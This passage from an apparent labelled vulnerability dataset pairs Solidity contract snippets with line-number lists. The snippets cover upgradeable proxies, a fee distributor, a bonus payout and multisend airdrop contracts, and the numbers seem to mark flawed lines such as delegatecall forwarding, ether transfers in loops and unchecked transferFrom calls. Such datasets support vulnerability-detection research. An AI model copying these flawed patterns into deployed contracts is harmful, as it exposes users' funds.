            if (address(this).balance > currentBonus + 1 ether) {
                currentBonus += 1 ether;
            } else {
                currentBonus = address(this).balance;
            }
        }
    }
    // distribute bonus to the last 10 addresses.
    function distributeBonus() external onlyOwner {
        require(lastBreedTime > 0 && block.timestamp - lastBreedTime >= BREED_ENDING_TIME, 'still breeding');
        uint256 breedAddressCount;
        for (uint256 i = 0; i < 10; i ++) {
            if (_lastBreedAddress[i] != address(0)) {
                breedAddressCount ++;
            }
        }
        if (currentBonus > address(this).balance) {
            currentBonus = address(this).balance;
        }
        // cut to equal pieces
        uint256 eachBonus = currentBonus / breedAddressCount;
        for (uint256 i = 0; i < 10; i ++) {
            if (_lastBreedAddress[i] != address(0)) {
                payable(_lastBreedAddress[i]).transfer(eachBonus);
            }
        }
        currentBonus = 0;
        // if balance left , return to creator.
        if (address(this).balance > 0) {
            payable(walletAddr).transfer(address(this).balance);
        }
        // emit event","[56, 72]"
"//SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
contract TadGenesisMiningProxy is OwnableStorage, PausableStorage, TadGenesisMiningStorage {
    event NewImplementation(address oldImplementation, address newImplementation);
    event NewAdmin(address oldAdmin, address newAdmin);
    constructor(TadGenesisMining newImplementation) public {
        admin = msg.sender;
        _owner = msg.sender;
        require(newImplementation.isTadGenesisMining() == true, ""invalid implementation"");
        implementation = address(newImplementation);
        emit NewImplementation(address(0), implementation);
    }
    /*** Admin Functions ***/
    function _setImplementation(TadGenesisMining  newImplementation) public {
        require(msg.sender==admin, ""UNAUTHORIZED"");
        require(newImplementation.isTadGenesisMining() == true, ""invalid implementation"");
        address oldImplementation = implementation;
        implementation = address(newImplementation);
        emit NewImplementation(oldImplementation, implementation);
    }
    /**
      * @notice Transfer of admin rights
      * @dev Admin function to change admin
      * @param newAdmin New admin.
      */
    function _setAdmin(address newAdmin) public {
        // Check caller = admin
        require(msg.sender==admin, ""UNAUTHORIZED"");
        // Save current value, if any, for inclusion in log
        address oldAdmin = admin;
        admin = newAdmin;
        emit NewAdmin(oldAdmin, newAdmin);
    }
    /**
     * @dev Delegates execution to an implementation contract.
     * It returns to the external caller whatever the implementation returns
     * or forwards reverts.
     */
    fallback() external {
        // delegate all other functions to current implementation
        (bool success, ) = implementation.delegatecall(msg.data);
        assembly {
              let free_mem_ptr := mload(0x40)
              returndatacopy(free_mem_ptr, 0, returndatasize())
              switch success
              case 0 { revert(free_mem_ptr, returndatasize()) }
              default { return(free_mem_ptr, returndatasize()) }
        }
    }
}",[41]
"//SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
contract TadUniswapMiningProxy is OwnableStorage, PausableStorage, TadUniswapMiningStorage {
    event NewImplementation(address oldImplementation, address newImplementation);
    event NewAdmin(address oldAdmin, address newAdmin);
    constructor(TadUniswapMining newImplementation) public {
        admin = msg.sender;
        _owner = msg.sender;
        require(newImplementation.isTadUniswapMining() == true, ""invalid implementation"");
        implementation = address(newImplementation);
        emit NewImplementation(address(0), implementation);
    }
    /*** Admin Functions ***/
    function _setImplementation(TadUniswapMining  newImplementation) public {
        require(msg.sender==admin, ""UNAUTHORIZED"");
        require(newImplementation.isTadUniswapMining() == true, ""invalid implementation"");
        address oldImplementation = implementation;
        implementation = address(newImplementation);
        emit NewImplementation(oldImplementation, implementation);
    }
    /**
      * @notice Transfer of admin rights
      * @dev Admin function to change admin
      * @param newAdmin New admin.
      */
    function _setAdmin(address newAdmin) public {
        // Check caller = admin
        require(msg.sender==admin, ""UNAUTHORIZED"");
        // Save current value, if any, for inclusion in log
        address oldAdmin = admin;
        admin = newAdmin;
        emit NewAdmin(oldAdmin, newAdmin);
    }
    /**
     * @dev Delegates execution to an implementation contract.
     * It returns to the external caller whatever the implementation returns
     * or forwards reverts.
     */
    fallback() external {
        // delegate all other functions to current implementation
        (bool success, ) = implementation.delegatecall(msg.data);
        assembly {
              let free_mem_ptr := mload(0x40)
              returndatacopy(free_mem_ptr, 0, returndatasize())
              switch success
              case 0 { revert(free_mem_ptr, returndatasize()) }
              default { return(free_mem_ptr, returndatasize()) }
        }
    }
}",[41]
"pragma solidity >=0.5.0 <0.6.0;
/**
 * @title Core
 * @dev Solidity version 0.5.x prevents to mark as view
 * @dev functions using delegate call.
 *
 * @author Cyril Lapinte - <cyril.lapinte@openfiz.com>
 *
 * Error messages
 *   CO01: Only Proxy may access the function
 *   CO02: The proxy has no delegates
 *   CO03: Delegatecall should be successfull
 *   CO04: Invalid delegateId
 *   CO05: Proxy must exist
 **/
contract Core is Storage {
  using BytesConvert for bytes;
  modifier onlyProxy {
    require(proxyDelegates[msg.sender] != address(0), ""CO01"");
    _;
  }
  function delegateCall(address _proxy) internal returns (bool status)
  {
    address delegate = proxyDelegates[_proxy];
    require(delegate != address(0), ""CO02"");
    // solhint-disable-next-line avoid-low-level-calls
    (status, ) = delegate.delegatecall(msg.data);
    require(status, ""CO03"");
  }
  function delegateCallUint256(address _proxy)
    internal returns (uint256)
  {
    return delegateCallBytes(_proxy).toUint256();
  }
  function delegateCallBytes(address _proxy)
    internal returns (bytes memory result)
  {
    bool status;
    address delegate = proxyDelegates[_proxy];
    require(delegate != address(0), ""CO04"");
    // solhint-disable-next-line avoid-low-level-calls
    (status, result) = delegate.delegatecall(msg.data);
    require(status, ""CO03"");
  }
  function defineProxy(
    address _proxy,
    uint256 _delegateId)
    internal returns (bool)
  {
    require(_delegateId < delegates.length, ""CO04"");
    address delegate = delegates[_delegateId];
    require(_proxy != address(0), ""CO05"");
    proxyDelegates[_proxy] = delegate;
    return true;
  }
  function removeProxy(address _proxy)
    internal returns (bool)
  {
    delete proxyDelegates[_proxy];
    return true;
  }
}",[27]
"    address public recipientBurn;
    /// @notice Smart contract implementing the logic to interact with a particular exchange.
    /// Will be called by DELEGATECALL
    IExchangeAdapter public exchangeAdapter;
    /// @notice Called by the proxy when setting this contract as implementation
    function initialize(
        address _recipientBurn,
        address _tokenToBurn,
        IExchangeAdapter _exchangeAdapter,
        address[] memory _receivers,
        uint256[] memory _percentages
    ) public initializer {
        recipientBurn = _recipientBurn;
        tokenToBurn = _tokenToBurn;
        exchangeAdapter = _exchangeAdapter;
        internalSetTokenDistribution(_receivers, _percentages);
        emit Setup(_tokenToBurn, _exchangeAdapter, _recipientBurn);
    }
    /// @notice In order to receive ETH transfers
    function() external payable {}
    /// @notice ""Infinite"" approval for all the tokens initialized
    /// @param _tokens List of IERC20 to approve
    function approveExchange(IERC20[] memory _tokens) public {
        (bool _success, ) = address(exchangeAdapter).delegatecall(
            abi.encodeWithSelector(exchangeAdapter.approveExchange.selector, _tokens)
        );
    }
    /// @notice Distributes the whole balance of a list of _tokens balances in this contract
    /// @param _tokens list of ERC20 tokens to distribute
    function distribute(IERC20[] memory _tokens) public {
        for (uint256 i = 0; i < _tokens.length; i++) {
            uint256 _balanceToDistribute = (address(_tokens[i]) != EthAddressLib.ethAddress())
                ? _tokens[i].balanceOf(address(this))
                : address(this).balance;
            if (_balanceToDistribute <= 0) {
                continue;
            }
            internalDistributeTokenWithAmount(_tokens[i], _balanceToDistribute);
        }
    }
    /// @notice Distributes specific amounts of a list of _tokens
    /// @param _tokens list of ERC20 tokens to distribute
    /// @param _amounts list of amounts to distribute per token
    function distributeWithAmounts(IERC20[] memory _tokens, uint256[] memory _amounts) public {
        for (uint256 i = 0; i < _tokens.length; i++) {
            internalDistributeTokenWithAmount(_tokens[i], _amounts[i]);
        }
    }
    /// @notice Distributes specific total balance's percentages of a list of _tokens
    /// @param _tokens list of ERC20 tokens to distribute
    /// @param _percentages list of percentages to distribute per token
    function distributeWithPercentages(IERC20[] memory _tokens, uint256[] memory _percentages) public {
        for (uint256 i = 0; i < _tokens.length; i++) {
            uint256 _amountToDistribute = (address(_tokens[i]) != EthAddressLib.ethAddress())
                ? _tokens[i].balanceOf(address(this)).mul(_percentages[i]).div(100)
                : address(this).balance.mul(_percentages[i]).div(100);
            if (_amountToDistribute <= 0) {
                continue;
            }
            internalDistributeTokenWithAmount(_tokens[i], _amountToDistribute);
        }
    }
    /// @notice Sets _receivers addresses with _percentages for each one
    /// @param _receivers Array of addresses receiving a percentage of the distribution, both user addresses
    ///   or contracts
    /// @param _percentages Array of percentages each _receivers member will get
    function internalSetTokenDistribution(address[] memory _receivers, uint256[] memory _percentages) internal {
        require(_receivers.length == _percentages.length, ""Array lengths should be equal"");
        distribution = Distribution({receivers: _receivers, percentages: _percentages});
        emit DistributionUpdated(_receivers, _percentages);
    }
    /// @notice Distributes a specific amount of a token owned by this contract
    /// @param _token The ERC20 token to distribute
    /// @param _amountToDistribute The specific amount to distribute
    function internalDistributeTokenWithAmount(IERC20 _token, uint256 _amountToDistribute) internal {
        address _tokenAddress = address(_token);
        Distribution memory _distribution = distribution;
        for (uint256 j = 0; j < _distribution.receivers.length; j++) {
            uint256 _amount = _amountToDistribute.mul(_distribution.percentages[j]).div(DISTRIBUTION_BASE);
            //avoid transfers/burns of 0 tokens
            if(_amount == 0){
                continue;
            }
            if (_distribution.receivers[j] != address(0)) {
                if (_tokenAddress != EthAddressLib.ethAddress()) {
                    _token.safeTransfer(_distribution.receivers[j], _amount);
                } else {
                    //solium-disable-next-line
                    (bool _success,) = _distribution.receivers[j].call.value(_amount)("""");
                    require(_success, ""Reverted ETH transfer"");
                }
                emit Distributed(_distribution.receivers[j], _distribution.percentages[j], _amount);
            } else {
                uint256 _amountToBurn = _amount;
                // If the token to burn is already tokenToBurn, we don't trade, burning directly
                if (_tokenAddress != tokenToBurn) {
                    (bool _success, bytes memory _result) = address(exchangeAdapter).delegatecall(
                        abi.encodeWithSelector(
                            exchangeAdapter.exchange.selector,
                            _tokenAddress,
                            tokenToBurn,
                            _amount,
                            10
                        )
                    );
                    require(_success, ""ERROR_ON_EXCHANGE"");
                    _amountToBurn = abi.decode(_result, (uint256));
                }
                internalBurn(_amountToBurn);
            }
        }
    }
    /// @notice Internal function to send _amount of tokenToBurn to the 0x0 address
    /// @param _amount The amount to burn
    function internalBurn(uint256 _amount) internal {
        require(IERC20(tokenToBurn).transfer(recipientBurn, _amount), ""INTERNAL_BURN. Reverted transfer to recipientBurn address"");
        emit Burn(_amount);
    }
    /// @notice Returns the receivers and percentages of the contract Distribution
    /// @return receivers array of addresses and percentages array on uints
    function getDistribution() public view returns(address[] memory receivers, uint256[] memory percentages) {
        receivers = distribution.receivers;
        percentages = distribution.percentages;
    }
    /// @notice Gets the revision number of the contract
    /// @return The revision numeric reference
    function getRevision() internal pure returns (uint256) {
        return IMPLEMENTATION_REVISION;","[24, 25, 26, 97, 98, 99, 100, 101, 102, 103, 104, 105]"
"// SPDX-License-Identifier: MIT
pragma solidity >0.7.5;
/**
 * @title Lib_ResolvedDelegateProxy
 */
contract Lib_ResolvedDelegateProxy {
    /*************
     * Variables *
     *************/
    mapping(string => address) public addressManager;
    /***************
     * Constructor *
     ***************/
    /**
     * @param _proxyTarget Address of the target contract.
     */
    constructor(
        address _proxyTarget
    ) {
        addressManager[""proxyTarget""] = _proxyTarget;
        addressManager[""proxyOwner""] = msg.sender;
    }
    /**********************
     * Function Modifiers *
     **********************/
    modifier proxyCallIfNotOwner() {
        if (msg.sender == addressManager[""proxyOwner""]) {
            _;
        } else {
            // This WILL halt the call frame on completion.
            _doProxyCall();
        }
    }
    /*********************
     * Fallback Function *
     *********************/
    fallback()
        external
        payable
    {
        // Proxy call by default.
        _doProxyCall();
    }
    /********************
     * Public Functions *
     ********************/
    /**
     * Update target
     *
     * @param _proxyTarget address of proxy target contract
     */
    function setTargetContract(
        address _proxyTarget
    )
        proxyCallIfNotOwner
        external
    {
        addressManager[""proxyTarget""] = _proxyTarget;
    }
    /**
     * Transfer owner
     */
    function transferProxyOwnership(
        address _newOwner
    )
        proxyCallIfNotOwner
        external
    {
        require(
            _newOwner != address(0),
            ""New owner cannot be the zero address.""
        );
        addressManager[""proxyOwner""] = _newOwner;
    }
    /**
     * Performs the proxy call via a delegatecall.
     */
    function _doProxyCall()
        internal
    {
        require(
            addressManager[""proxyOwner""] != address(0),
            ""Target address must be initialized.""
        );
        (bool success, bytes memory returndata) = addressManager[""proxyTarget""].delegatecall(msg.data);
        if (success == true) {
            assembly {
                return(add(returndata, 0x20), mload(returndata))
            }
        } else {
            assembly {
                revert(add(returndata, 0x20), mload(returndata))
            }
        }
    }
}",[85]
"	function setOperator(address payable adminAddr, bool flag) onlyOwner external returns (bool result) {
		bytes memory callData = abi.encodeWithSelector(
				IManagerSlotSetter
				.setOperator.selector,
				adminAddr, flag
			);
		(result, ) = slotSetterAddr.delegatecall(callData);
    assert(result);
	}
	/**
	* @dev Set the address of OracleProxy contract
	* @param oracleProxyAddr The address of OracleProxy contract
	* @return result the setter call in contextSetter contract
	*/
	function setOracleProxy(address oracleProxyAddr) onlyOwner external returns (bool result) {
    bytes memory callData = abi.encodeWithSelector(
				IManagerSlotSetter
				.setOracleProxy.selector,
				oracleProxyAddr
			);
		(result, ) = slotSetterAddr.delegatecall(callData);
    assert(result);
	}
	/**
	* @dev Set the address of BiFi reward token contract
	* @param erc20Addr The address of BiFi reward token contract
	* @return result the setter call in contextSetter contract
	*/
	function setRewardErc20(address erc20Addr) onlyOwner public returns (bool result) {
    bytes memory callData = abi.encodeWithSelector(
				IManagerSlotSetter
				.setRewardErc20.selector,
				erc20Addr
			);
		(result, ) = slotSetterAddr.delegatecall(callData);
    assert(result);
	}
	/**
	* @dev Authorize admin user for circuitBreaker
	* @param _target The address of the circuitBreaker admin user.
	* @param _status The boolean status of circuitBreaker (on/off)
	* @return result the setter call in contextSetter contract
	*/
	function setBreakerTable(address _target, bool _status) onlyOwner external returns (bool result) {
    bytes memory callData = abi.encodeWithSelector(
				IManagerSlotSetter
				.setBreakerTable.selector,
				_target, _status
			);
		(result, ) = slotSetterAddr.delegatecall(callData);
    assert(result);
	}
	/**
	* @dev Set circuitBreak to freeze/unfreeze all handlers
	* @param _emergency The boolean status of circuitBreaker (on/off)
	* @return result the setter call in contextSetter contract
	*/
	function setCircuitBreaker(bool _emergency) onlyBreaker external returns (bool result) {
		bytes memory callData = abi.encodeWithSelector(
				IManagerSlotSetter
				.setCircuitBreaker.selector,
				_emergency
			);
		(result, ) = slotSetterAddr.delegatecall(callData);
    assert(result);
	}
	function setSlotSetterAddr(address _slotSetterAddr) onlyOwner external returns (bool result) {
			bytes memory callData = abi.encodeWithSelector(
					IManagerSlotSetter.setSlotSetterAddr.selector,
					_slotSetterAddr
				);
			(result, ) = slotSetterAddr.delegatecall(callData);
		assert(result);
	}
	function sethandlerManagerAddr(address _handlerManagerAddr) onlyOwner external returns (bool result) {
			bytes memory callData = abi.encodeWithSelector(
					IManagerSlotSetter.sethandlerManagerAddr.selector,
					_handlerManagerAddr
				);
			(result, ) = slotSetterAddr.delegatecall(callData);
		assert(result);
	}
	function setFlashloanAddr(address _flashloanAddr) onlyOwner external returns (bool result) {
			bytes memory callData = abi.encodeWithSelector(
					IManagerSlotSetter.setFlashloanAddr.selector,
					_flashloanAddr
				);
			(result, ) = slotSetterAddr.delegatecall(callData);
		assert(result);
	}
	function setPositionStorageAddr(address _positionStorageAddr) onlyOwner external returns (bool result) {
			bytes memory callData = abi.encodeWithSelector(
					IManagerSlotSetter.setPositionStorageAddr.selector,
					_positionStorageAddr
				);
			(result, ) = slotSetterAddr.delegatecall(callData);
		assert(result);
	}
	function setNFTAddr(address _nftAddr) onlyOwner external returns (bool result) {
			bytes memory callData = abi.encodeWithSelector(
					IManagerSlotSetter.setNFTAddr.selector,
					_nftAddr
				);
			(result, ) = slotSetterAddr.delegatecall(callData);
		assert(result);
	}
	function setFlashloanFee(uint256 handlerID, uint256 flashFeeRate) onlyOwner external returns (bool result) {
			bytes memory callData = abi.encodeWithSelector(
					IManagerSlotSetter
					.setFlashloanFee.selector,
					handlerID,
			    	flashFeeRate
				);
			(result, ) = slotSetterAddr.delegatecall(callData);
		assert(result);
	}
	function setDiscountBase(uint256 handlerID, uint256 feeBase) onlyOwner external returns (bool result) {
			bytes memory callData = abi.encodeWithSelector(
					IManagerSlotSetter
					.setDiscountBase.selector,
					handlerID,
			    feeBase
				);
			(result, ) = slotSetterAddr.delegatecall(callData);
		assert(result);
	}
	/**
	* @dev Get the circuitBreak status",[64]
"      uint256 handlerID,
      uint256 amount,
      uint256 bifiAmount
    ) external returns (uint256) {
      bytes memory callData = abi.encodeWithSelector(
				IManagerFlashloan
				.getFeeFromArguments.selector,
				handlerID, amount, bifiAmount
			);
      (bool result, bytes memory returnData) = flashloanAddr.delegatecall(callData);
      assert(result);
      return abi.decode(returnData, (uint256));
    }
	/**
	* @dev Get the deposit and borrow amount of the user for the handler (internal)
	* @param userAddr The address of user
	* @param handlerID The handler ID
	* @return The deposit and borrow amount
	*/
	function _getHandlerAmount(address payable userAddr, uint256 handlerID) internal view returns (uint256, uint256)
	{
		IProxy TokenHandler = IProxy(dataStorageInstance.getTokenHandlerAddr(handlerID));
		bytes memory data;
		(, data) = TokenHandler.handlerViewProxy(
			abi.encodeWithSelector(
				IMarketHandler
				.getUserAmount.selector,
				userAddr
			)
		);
		return abi.decode(data, (uint256, uint256));
	}
  	/**
	* @dev Get the deposit and borrow amount with interest of the user for the handler (internal)
	* @param userAddr The address of user
	* @param handlerID The handler ID
	* @return The deposit and borrow amount with interest
	*/
	function _getHandlerAmountWithAmount(address payable userAddr, uint256 handlerID) internal view returns (uint256, uint256)
	{
		IProxy TokenHandler = IProxy(dataStorageInstance.getTokenHandlerAddr(handlerID));
		bytes memory data;
		(, data) = TokenHandler.handlerViewProxy(
			abi.encodeWithSelector(
				IMarketHandler
				.getUserAmountWithInterest.selector,
				userAddr
			)
		);
		return abi.decode(data, (uint256, uint256));
	}
	/**
	* @dev Set the support stauts for the handler
	* @param handlerID the handler ID
	* @param support the support status (boolean)
	* @return result the setter call in contextSetter contract
	*/
	function setHandlerSupport(uint256 handlerID, bool support) onlyOwner public returns (bool result) {
		bytes memory callData = abi.encodeWithSelector(
				IManagerSlotSetter
				.setHandlerSupport.selector,
				handlerID, support
			);
		(result, ) = slotSetterAddr.delegatecall(callData);
    assert(result);
	}
	/**
	* @dev Get owner's address of the manager contract
	* @return The address of owner
	*/
	function getOwner() public view returns (address)
	{
		return owner;
	}
	/**
	* @dev Get the deposit and borrow amount of the user with interest added
	* @param userAddr The address of user
	* @param handlerID The handler ID
	* @return The deposit and borrow amount of the user with interest
	*/
	function _getUserIntraHandlerAssetWithInterest(address payable userAddr, uint256 handlerID) internal view returns (uint256, uint256)
	{
		uint256 price = _getTokenHandlerPrice(handlerID);
		IProxy TokenHandler = IProxy(dataStorageInstance.getTokenHandlerAddr(handlerID));
		uint256 depositAmount;
		uint256 borrowAmount;
		bytes memory data;
		(, data) = TokenHandler.handlerViewProxy(
			abi.encodeWithSelector(
				IMarketHandler.getUserAmountWithInterest.selector,
				userAddr
			)
		);
		(depositAmount, borrowAmount) = abi.decode(data, (uint256, uint256));
		uint256 depositAsset = depositAmount.unifiedMul(price);
		uint256 borrowAsset = borrowAmount.unifiedMul(price);
		return (depositAsset, borrowAsset);
	}
	/**
	* @dev Get the depositTotalCredit and borrowTotalCredit
	* @param userAddr The address of the user
	* @return depositTotalCredit The amount that users can borrow (i.e. deposit * borrowLimit)
	* @return borrowTotalCredit The sum of borrow amount for all handlers
	*/
	function _getUserTotalIntraCreditAsset(address payable userAddr) internal view returns (uint256, uint256)
	{
		uint256 depositTotalCredit;
		uint256 borrowTotalCredit;
		for (uint256 handlerID; handlerID < tokenHandlerLength; handlerID++)
		{
			if (dataStorageInstance.getTokenHandlerSupport(handlerID))
			{
				uint256 depositHandlerAsset;
				uint256 borrowHandlerAsset;
				(depositHandlerAsset, borrowHandlerAsset) = _getUserIntraHandlerAssetWithInterest(userAddr, handlerID);
				uint256 borrowLimit = _getTokenHandlerBorrowLimit(handlerID);
				uint256 depositHandlerCredit = depositHandlerAsset.unifiedMul(borrowLimit);
				depositTotalCredit = depositTotalCredit.add(depositHandlerCredit);
				borrowTotalCredit = borrowTotalCredit.add(borrowHandlerAsset);
			}
			else
			{
				continue;
			}
		}
		return (depositTotalCredit, borrowTotalCredit);
	}
	/**",[64]
"/*
  .oooooo.              o8o                           o8o                     
 d8P'  `Y8b             `""'                           `""'                     
888           .ooooo.  oooo  ooo. .oo.   oooo    ooo oooo   .oooo.o  .ooooo.  
888          d88' `88b `888  `888P""Y88b   `88.  .8'  `888  d88(  ""8 d88' `88b 
888          888   888  888   888   888    `88..8'    888  `""Y88b.  888ooo888 
`88b    ooo  888   888  888   888   888     `888'     888  o.  )88b 888    .o 
 `Y8bood8P'  `Y8bod8P' o888o o888o o888o     `8'     o888o 8""""888P' `Y8bod8P' 
*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface IERC20 {
  function transfer(address to, uint256 value) external returns (bool);
  function transferFrom(
    address from,
    address to,
    uint256 value
  ) external returns (bool);
}
contract Multisend {
  function multisendEther(address[] memory recipients, uint256[] memory values)
    external
    payable
  {
    for (uint256 i = 0; i < recipients.length; i++)
      payable(recipients[i]).transfer(values[i]);
    uint256 balance = address(this).balance;
    if (balance > 0) payable(msg.sender).transfer(balance);
  }
  function multisendToken(
    IERC20 token,
    address[] memory recipients,
    uint256[] memory values
  ) external {
    uint256 total = 0;
    for (uint256 i = 0; i < recipients.length; i++) total += values[i];
    require(token.transferFrom(msg.sender, address(this), total));
    for (uint256 i = 0; i < recipients.length; i++)
      require(token.transfer(recipients[i], values[i]));
  }
}","[25, 26, 27]"
"// Roman Storm Multi Sender
// To Use this Dapp: https://rstormsf.github.io/multisender
/**
 * @title ERC20Basic
 * @dev Simpler version of ERC20 interface
 * @dev see https://github.com/ethereum/EIPs/issues/179
 */
contract ERC20Basic {
    function totalSupply() public view returns (uint256);
    function balanceOf(address who) public view returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public view returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract UpgradebleAirdropSender is OwnedUpgradeabilityStorage, Claimable {
    using SafeMath for uint256;
    event Multisended(uint256 total, address tokenAddress);
    event ClaimedTokens(address token, address owner, uint256 balance);
    modifier hasFee() {
        if (currentFee(msg.sender) > 0) {
            require(msg.value >= currentFee(msg.sender));
        }
        _;
    }
    function() public payable {}
    constructor() public {
        initialize(msg.sender);
    }
    function initialize(address _owner) private {
        require(!initialized());
        setOwner(_owner);
        setArrayLimit(200);
        boolStorage[keccak256(""rs_multisender_initialized"")] = true;
    }
    function initialized() public view returns (bool) {
        return boolStorage[keccak256(""rs_multisender_initialized"")];
    }
    function txCount(address customer) public view returns(uint256) {
        return uintStorage[keccak256(abi.encodePacked(""txCount"", customer))];
    }
    function arrayLimit() public view returns(uint256) {
        return uintStorage[keccak256(abi.encodePacked(""arrayLimit""))];
    }
    function setArrayLimit(uint256 _newLimit) public onlyOwner {
        require(_newLimit != 0);
        uintStorage[keccak256(""arrayLimit"")] = _newLimit;
    }
    function discountStep() public view returns(uint256) {
        return uintStorage[keccak256(""discountStep"")];
    }
    function setDiscountStep(uint256 _newStep) public onlyOwner {
        require(_newStep != 0);
        uintStorage[keccak256(""discountStep"")] = _newStep;
    }
    function fee() public view returns(uint256) {
        return uintStorage[keccak256(""fee"")];
    }
    function currentFee(address _customer) public view returns(uint256) {
        if (fee() > discountRate(msg.sender)) {
            return fee().sub(discountRate(_customer));
        } else {
            return 0;
        }
    }
    function setFee(uint256 _newStep) public onlyOwner {
        require(_newStep != 0);
        uintStorage[keccak256(""fee"")] = _newStep;
    }
    function discountRate(address _customer) public view returns(uint256) {
        uint256 count = txCount(_customer);
        return count.mul(discountStep());
    }
    function multisendToken(address token, address[] _contributors, uint256[] _balances) public hasFee payable {
        if (token == 0x000000000000000000000000000000000000bEEF){
            multisendEther(_contributors, _balances);
        } else {
            uint256 total = 0;
            require(_contributors.length <= arrayLimit());
            ERC20 erc20token = ERC20(token);
            uint8 i = 0;
            for (i; i < _contributors.length; i++) {
               erc20token.transferFrom(msg.sender, _contributors[i], _balances[i]);
               total += _balances[i];
            }
            setTxCount(msg.sender, txCount(msg.sender).add(1));
            emit Multisended(total, token);
        }
    }
    function multisendEther(address[] _contributors, uint256[] _balances) public payable {
        uint256 total = msg.value;
        uint256 userfee = currentFee(msg.sender);
        require(total >= userfee);
        require(_contributors.length <= arrayLimit());
        total = total.sub(userfee);
        uint256 i = 0;
        for (i; i < _contributors.length; i++) {
            require(total >= _balances[i]);
            total = total.sub(_balances[i]);
            _contributors[i].transfer(_balances[i]);
        }
        setTxCount(msg.sender, txCount(msg.sender).add(1));
        emit Multisended(msg.value, 0x000000000000000000000000000000000000bEEF);
    }
    function claimTokens(address _token) public onlyOwner {
        if (_token == 0x0) {
            owner().transfer(address(this).balance);
            return;
        }
        ERC20 erc20token = ERC20(_token);
        uint256 balance = erc20token.balanceOf(this);
        erc20token.transfer(owner(), balance);
        emit ClaimedTokens(_token, owner(), balance);
    }
    function setTxCount(address customer, uint256 _txCount) private {
        uintStorage[keccak256(abi.encodePacked(""txCount"", customer))] = _txCount;
    }
}","[87, 104]"
"// Roman Storm Multi Sender
// To Use this Dapp: https://rstormsf.github.io/multisender
/**
 * @title ERC20Basic
 * @dev Simpler version of ERC20 interface
 * @dev see https://github.com/ethereum/EIPs/issues/179
 */
contract ERC20Basic {
    function totalSupply() public view returns (uint256);
    function balanceOf(address who) public view returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public view returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract UpgradebleStormSender is OwnedUpgradeabilityStorage, Claimable {
    using SafeMath for uint256;
    event Multisended(uint256 total, address tokenAddress);
    event ClaimedTokens(address token, address owner, uint256 balance);
    modifier hasFee() {
        if (currentFee(msg.sender) > 0) {
            require(msg.value >= currentFee(msg.sender));
        }
        _;
    }
    function() public payable {}
    function initialize(address _owner) public {
        require(!initialized());
        setOwner(_owner);
        setArrayLimit(200);
        setDiscountStep(0.00005 ether);
        setFee(0.05 ether);
        boolStorage[keccak256(""rs_multisender_initialized"")] = true;
    }
    function initialized() public view returns (bool) {
        return boolStorage[keccak256(""rs_multisender_initialized"")];
    }
    function txCount(address customer) public view returns(uint256) {
        return uintStorage[keccak256(abi.encodePacked(""txCount"", customer))];
    }
    function arrayLimit() public view returns(uint256) {
        return uintStorage[keccak256(abi.encodePacked(""arrayLimit""))];
    }
    function setArrayLimit(uint256 _newLimit) public onlyOwner {
        require(_newLimit != 0);
        uintStorage[keccak256(""arrayLimit"")] = _newLimit;
    }
    function discountStep() public view returns(uint256) {
        return uintStorage[keccak256(""discountStep"")];
    }
    function setDiscountStep(uint256 _newStep) public onlyOwner {
        require(_newStep != 0);
        uintStorage[keccak256(""discountStep"")] = _newStep;
    }
    function fee() public view returns(uint256) {
        return uintStorage[keccak256(""fee"")];
    }
    function currentFee(address _customer) public view returns(uint256) {
        if (fee() > discountRate(msg.sender)) {
            return fee().sub(discountRate(_customer));
        } else {
            return 0;
        }
    }
    function setFee(uint256 _newStep) public onlyOwner {
        require(_newStep != 0);
        uintStorage[keccak256(""fee"")] = _newStep;
    }
    function discountRate(address _customer) public view returns(uint256) {
        uint256 count = txCount(_customer);
        return count.mul(discountStep());
    }
    function multisendToken(address token, address[] _contributors, uint256[] _balances) public hasFee payable {
        if (token == 0x000000000000000000000000000000000000bEEF){
            multisendEther(_contributors, _balances);
        } else {
            uint256 total = 0;
            require(_contributors.length <= arrayLimit());
            ERC20 erc20token = ERC20(token);
            uint8 i = 0;
            for (i; i < _contributors.length; i++) {
                erc20token.transferFrom(msg.sender, _contributors[i], _balances[i]);
                total += _balances[i];
            }
            setTxCount(msg.sender, txCount(msg.sender).add(1));
            emit Multisended(total, token);
        }
    }
    function multisendEther(address[] _contributors, uint256[] _balances) public payable {
        uint256 total = msg.value;
        uint256 userfee = currentFee(msg.sender);
        require(total >= userfee);
        require(_contributors.length <= arrayLimit());
        total = total.sub(userfee);
        uint256 i = 0;
        for (i; i < _contributors.length; i++) {
            require(total >= _balances[i]);
            total = total.sub(_balances[i]);
            _contributors[i].transfer(_balances[i]);
        }
        setTxCount(msg.sender, txCount(msg.sender).add(1));
        emit Multisended(msg.value, 0x000000000000000000000000000000000000bEEF);
    }
    function claimTokens(address _token) public onlyOwner {
        if (_token == 0x0) {
            owner().transfer(address(this).balance);
            return;
        }
        ERC20 erc20token = ERC20(_token);
        uint256 balance = erc20token.balanceOf(this);
        erc20token.transfer(owner(), balance);
        emit ClaimedTokens(_token, owner(), balance);
    }
    function setTxCount(address customer, uint256 _txCount) private {
        uintStorage[keccak256(abi.encodePacked(""txCount"", customer))] = _txCount;
    }
}",[103]
"// Roman Storm Multi Sender
// To Use this Dapp: https://rstormsf.github.io/multisender
/**
 * @title ERC20Basic
 * @dev Simpler version of ERC20 interface
 * @dev see https://github.com/ethereum/EIPs/issues/179
 */
contract ERC20Basic {
    function totalSupply() public view returns (uint256);
    function balanceOf(address who) public view returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public view returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
